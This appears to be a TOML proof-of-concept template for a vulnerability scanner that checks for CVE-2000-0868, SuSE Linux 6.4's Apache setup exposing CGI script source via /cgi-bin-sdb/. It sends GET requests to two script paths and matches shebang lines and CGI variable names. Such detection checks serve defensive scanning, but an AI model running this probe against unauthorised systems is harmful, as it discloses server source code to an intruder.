[info]
author = "ave"
description = "检测 SuSE Linux 6.4 默认 Apache 配置是否允许通过 /cgi-bin-sdb/ 访问 CGI 脚本源代码"
id = "POC-AVE-2000-0983"
name = "CVE-2000-0868 PoC"
severity = "medium"
tags = ["ave-2000-0983"]
vuln_id = [
    "CVE-2000-0868",
    "AVE-2000-0983",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/cgi-bin-sdb/printenv"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "#!/usr/bin/perl",
    "#!/bin/sh",
    "#!/bin/bash",
    "SERVER_SOFTWARE",
    "GATEWAY_INTERFACE",
]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/cgi-bin-sdb/test-cgi"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "#!/usr/bin/perl",
    "#!/bin/sh",
    "#!/bin/bash",
    "SERVER_SOFTWARE",
    "GATEWAY_INTERFACE",
    "REQUEST_METHOD",
]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
